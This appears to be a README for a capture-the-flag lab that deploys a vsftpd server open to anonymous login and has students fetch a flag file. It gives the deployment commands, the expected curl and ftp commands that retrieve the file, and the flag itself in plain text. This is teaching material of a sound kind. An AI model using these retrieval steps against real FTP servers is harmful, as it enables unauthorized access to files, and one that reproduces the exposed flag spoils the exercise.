# ftp-anon — Anonymous FTP Access

**Vulnerability:** FTP server accepts anonymous logins, exposing sensitive files  
**Tool:** `ftp`, `curl`  
**Flag:** `WMG{anon_ftp_1s_a_s3curity_r1sk}`

## Scenario

vsftpd is configured to allow anonymous logins. A flag file sits in the public
FTP directory (`/var/ftp/pub/flag.txt`). Students discover the open FTP port,
connect anonymously, and retrieve the file.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/ftp-anon/setup.yml
```

First run: `ok=10 changed=6`  
Second run: `ok=10 changed=0` (idempotent)

## Verify

```bash
./agent-harness/verify.sh ftp-anon
```

## Expected exploit

```bash
# Using curl (anonymous FTP download)
curl ftp://127.0.0.1/pub/flag.txt
# → WMG{anon_ftp_1s_a_s3curity_r1sk}

# Or using the ftp client
ftp -n 127.0.0.1 21 <<'EOF'
user anonymous ""
get /pub/flag.txt /tmp/flag.txt
bye
EOF
cat /tmp/flag.txt
```

## Training

`training.json` — 9 levels: port scan → FTP discovery → anonymous login → file enumeration → flag retrieval → ASSESSMENT.  
MITRE ATT&CK: T1048 (Exfiltration Over Alternative Protocol), T1083 (File and Directory Discovery).
